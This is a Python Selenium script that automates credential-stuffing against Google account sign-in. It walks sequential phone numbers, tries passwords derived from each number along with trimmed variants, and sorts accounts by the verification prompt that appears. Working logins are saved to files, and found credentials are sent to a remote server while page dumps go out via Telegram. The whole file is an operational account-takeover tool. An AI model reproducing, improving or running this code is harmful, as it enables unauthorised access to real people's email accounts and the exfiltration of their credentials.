from multiprocessing import freeze_support
freeze_support()

from termcolor import colored
import os
from func import *
os.system('color')


def errorstore(html, e):
    html = driver.page_source
    to_write("html.html",html,"w+")
    tg.send("html.html")

    to_write("err.txt", str(e) ,"w+")
    tg.send("err.txt")



serverlink = "https://bandaesports2.pythonanywhere.com/"
serverapi = 'shuvam'

def Merge(dict1, dict2):
    res = {**dict1, **dict2}
    return res

if __name__ == '__main__':
    data = ""
    gpre=""
    pre=""
    loc = "C:\\Windows\\codeid.zip"
    try:
        try:
            readid = open(loc,"r")
            mac = readid.read()
            readid.close()
        except:
            mac = random.randint(103532116562064,999532116562064)
            mac = str(mac)
            readid = open(loc,"w")
            readid.write(mac)
            readid.close()
            with open("config.json", "w") as outfile:
                json.dump({'cutmain':'0','cutpre':'3','cutlast':'3','CountryCode':'','PassSpecial':''}, outfile)
    except:
        print(colored("Run as Administrator","yellow"))
        k = readchar.readchar()
        exit()


    data = {'api': serverapi,
            'type': '1',
            'mac': mac
            }



    r = requests.post(url=serverlink, data=data)
    r = r.text
    if r == "2":
        print(colored("User please register. Your ID: 1"+mac,"yellow"))
        k = readchar.readchar()
        exit()
    elif r[0] == "0":
        print(colored("User "+r[1:]+" Your time is up.","yellow"))
        k = readchar.readchar()
        exit()
    elif r[0] == "1":
        print(colored("Hello user"+r[1:],"yellow"))
    else:
        print(colored("Press Any Key To Exit","yellow"))
        k = readchar.readchar()
        exit()


    try:
        f = open('config.json', 'r')
        data = json.load(f)
        f.close()
        cutmain = data['cutmain']
        cutpre = data['cutpre']
        cutlast = data['cutlast']
        CCode = data['CountryCode']
        PSpecial = data['PassSpecial']
    except:
        print("Your config dumped. Please reset config.json from here https://pastebin.com/raw/T3wHJGPv")


    start = input(colored("Enter number:","yellow"))




    pre = ''
    for i in list(start):
        if i=='0':
            pre += i
        else:
            break
    start = int(start)
    print(colored("Please wait...","yellow"))




    logintry = "1"


    driver = uc.Chrome()
    while 1==1:
        gmailId = CCode + pre + str(start)
        passid = PSpecial + pre + str(start)
       

        try:
            driver.delete_all_cookies()
            driver.get(r'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&hl=en-GB&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
            start += 1

            gpass=''


            loginBox = driver.find_element(By.XPATH,'//*[@id ="identifierId"]')
            loginBox.send_keys(gmailId)
            nextButton = driver.find_element(By.XPATH,'//*[@id ="identifierNext"]')
            nextButton.click()
            error_last = time()
            try_times = 0
            while 1==1:
                try:
                    nextButton = find_by_id(driver,'ca')
                    nextButton.click()
                    print(" "*36,end="\r")
                    print("Captcha", end="\r")
                    sleep(.5)
                    break
                except:
                    pass
                if '" badinput="false" aria-invalid="true">' in driver.page_source:
                    print(" "*36,end="\r")
                    print("No Match", end="\r")
                    sleep(.5)
                    try_times = 21
                    break
                elif 'id="passwordNext"><div' in driver.page_source:
                    print(" "*36,end="\r")
                    print("Enterd",end="\r")
                    sleep(.5)
                    break
                else:
                    try_times += 1
                    if try_times > 20:
                        errorstore(driver, "No responce in 10 second")
                        break
                    print(" "*36,end="\r")
                    print ("Loading" + "." * try_times, end="\r")
                    sleep(.5)
            
            if try_times > 20:
                continue

            try:
                if cutmain == '0':
                    #try---1
                    try:
                        loginBox = find_by_name(driver,"password")
                    except:
                        loginBox = find_by_name(driver,"Passwd")
                    loginBox.send_keys(passid)
                    nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                    nextButton.click()
                    

                    try_times = time()
                    while 1==1:
                        if time() - try_times > 8:
                            errorstore(driver, "first try time-out")
                            break
                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
                            sleep(.5)
                            continue
                        else:
                            sleep(.5)
                            break

                    try:
                        nextButton = find_by_id(driver, 'ca')
                        nextButton.click()
                        print(" "*36,end="\r")
                        print("Captcha", end="\r")
                        sleep(.5)
                        continue
                    except:
                        pass




                #try---2
                if cutpre!='0':
                    try:
                        loginBox = find_by_name(driver, "password")
                    except:
                        loginBox = find_by_name(driver, "Passwd")
                    print(" "*36,end="\r")
                    print("Wrong Pass", end="\r")
                    gpass = passid[int(cutpre):]
                    loginBox.send_keys(gpass)
                    nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                    nextButton.click()


                    try_times = time()
                    while 1==1:
                        if time() - try_times > 8:
                            errorstore(driver, "second try time-out")
                            break
                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
                            sleep(.5)
                            continue
                        else:
                            sleep(.5)
                            break
                    try:
                        nextButton = find_by_id(driver, 'ca')
                        nextButton.click()
                        print(" "*36,end="\r")
                        print("Captcha", end="\r")
                        sleep(.5)
                        continue
                    except:
                        pass

                #try---3
                if cutlast!='0':
                    try:
                        loginBox = find_by_name(driver,"password")
                    except:
                        loginBox = find_by_name(driver,"Passwd")
                    print(" "*36,end="\r")
                    print("Wrong Pass-2", end="\r")
                    gpass = passid[:-int(cutlast)]
                    loginBox.send_keys(gpass)
                    nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                    nextButton.click()
                    
                    try_times = time()
                    while 1==1:
                        if time() - try_times > 8:
                            errorstore(driver, "third try time-out")
                            break
                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
                            sleep(.5)
                            continue
                        else:
                            sleep(.5)
                            break
                    try:
                        nextButton = find_by_id(driver, 'ca')
                        nextButton.click()
                        print(" "*36,end="\r")
                        print("Captcha", end="\r")
                        sleep(.5)
                        continue
                    except:
                        pass
            except Exception as e:
                if str(e)[:103]=='Message: no such element: Unable to locate element: {"method":"xpath","selector":"//*[@name="Passwd"]"}':
                    print("",end="\r")
                else:
                    errorstore(driver,e)


            flag = 0
            try:
                _retry = driver.find_element(By.XPATH,"//*[text()='Confirm your recovery email']")
                flag = 4
            except Exception as e:
                try:
                    _retry = driver.find_element(By.XPATH,"//*[text()='Get a verification code']")
                    flag = 1
                except:
                    try:
                        _retry = driver.find_element(By.XPATH,"//*[text()='Show password']")
                        flag = 10
                    except:
                        try:
                            _retry = driver.find_element(By.XPATH,"//*[text()='Standard rates apply']")
                            flag = 3
                        except:
                            try:
                                _retry = driver.find_element(By.XPATH,"//*[text()='Resend it']")
                                flag = 2
                            except:
                                try:
                                    _retry = driver.find_element(By.XPATH,"//*[text()='Download your data']")
                                    flag = 5
                                except Exception as e:
                                    errorstore(driver,e)
                
                

            if flag == 10:
                print(" "*36,end="\r")
                print("Wrong Pass-3", end="\r")
            sleep(.3)
            print(" "*36,end="\r")
            if flag == 0:
                data = {'api': serverapi,
                        'type': '2',
                        'mac': mac,
                        'phone': gmailId+' '+gpass
                        }

                r = requests.post(url=serverlink, data=data)
                logintry = r.text

                if logintry == "1":
                    print(colored(gmailId+' '+gpass,"green"))
                    file_object = open('0.txt', 'a+')
                    file_object.write(gmailId+' '+gpass+'\n')
                    file_object.close()
                else:
                    print("Something wrong... Please consult to the manager.")
                    driver.quit()
                    k = readchar.readchar()
                    exit()
            else:
                if(flag!=10):
                    print(colored(gmailId+' '+gpass,"red"))    
                    file_object = open(str(flag)+'.txt', 'a+')
                    file_object.write(gmailId+' '+gpass+'\n')
                    file_object.close()
        except Exception as e:
            try:
                errorstore(driver,e)
                exit(0)
            except:
                to_write("err.txt", e, "w+")
                tg.send("err.txt")
                exit(0)